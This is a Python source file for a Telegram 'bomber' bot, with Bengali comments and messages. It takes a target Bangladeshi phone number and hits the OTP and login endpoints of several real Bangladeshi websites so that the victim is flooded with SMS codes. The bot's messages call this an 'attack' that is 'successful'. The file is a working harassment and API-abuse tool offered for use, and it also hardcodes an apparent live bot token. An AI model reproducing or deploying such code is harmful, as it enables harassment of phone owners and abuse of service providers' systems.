import os
import telebot
import requests
from flask import Flask, request

# আপনার কনফিগারেশন
TOKEN = "8522736474:AAEeqI9riuBrlp8sCSOLyVXUtXHkbddru48"
ADMIN_ID = 6900182564

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# ওটিপি পাঠানোর ফাংশন (উন্নত এপিআই সহ)
def send_otp(phone):
    # ১১ ডিজিট ঠিক আছে কি না নিশ্চিত করা
    if not (phone.startswith("01") and len(phone) == 11):
        return 0
    
    apis = [
        f"https://bikroy.com/data/is-number-registered?phone={phone}",
        f"https://www.shajgoj.com/wp-admin/admin-ajax.php?action=login_mobile_otp&mobile={phone}",
        f"https://osudpotro.com/api/v1/users/send-otp?phone={phone}",
        f"https://redx.com.bd/api/v1/send-otp?phone={phone}",
        f"https://paperfly.com.bd/api/v1/customer-login-otp?phone={phone}",
        f"https://api.btracmotors.com/api/v1/auth/send-otp?mobile={phone}"
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    success = 0
    for url in apis:
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code == 200:
                success += 1
        except:
            continue
    return success

@bot.message_handler(commands=['start'])
def start(message):
    # নিরাপত্তা চেক: শুধু আপনি ব্যবহার করতে পারবেন
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ **দুঃখিত বস! এই বটটি ব্যবহারের অনুমতি আপনার নেই।**")
        return

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("💣 অ্যাটাক শুরু করুন", callback_data="start_bomb"))
    
    bot.send_message(message.chat.id, 
                     f"👋 **স্বাগতম বস!**\n\nবট এখন আপনার জন্য প্রস্তুত। বোম্বিং করতে নিচের বাটনে ক্লিক করুন।", 
                     reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "start_bomb":
        msg = bot.send_message(call.message.chat.id, "📞 **টার্গেট নম্বরটি দিন (যেমন: 017xxxxxxxx):**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_bombing)

def process_bombing(message):
    phone = message.text
    if len(phone) == 11 and phone.isdigit():
        bot.send_message(message.chat.id, f"🚀 **{phone}** নম্বরে অ্যাটাক শুরু হয়েছে। দয়া করে অপেক্ষা করুন...")
        
        # ওটিপি পাঠানো
        hits = send_otp(phone)
        
        bot.send_message(message.chat.id, f"✅ **অ্যাটাক সফল!**\n\nমোট {hits}টি ওটিপি পাঠানো হয়েছে।\nআবার করতে চাইলে /start দিন।")
    else:
        bot.send_message(message.chat.id, "❌ **ভুল নম্বর!** ১১ ডিজিটের সঠিক নম্বর দিন। /start দিয়ে আবার চেষ্টা করুন।")

# Render Webhook logic
@app.route('/' + TOKEN, methods=['POST'])
def getMessage():
    bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
    return "!", 200

@app.route("/")
def webhook():
    bot.remove_webhook()
    bot.set_webhook(url='https://' + request.host + '/' + TOKEN)
    return "<h1>Bomber Bot is Active!</h1>", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
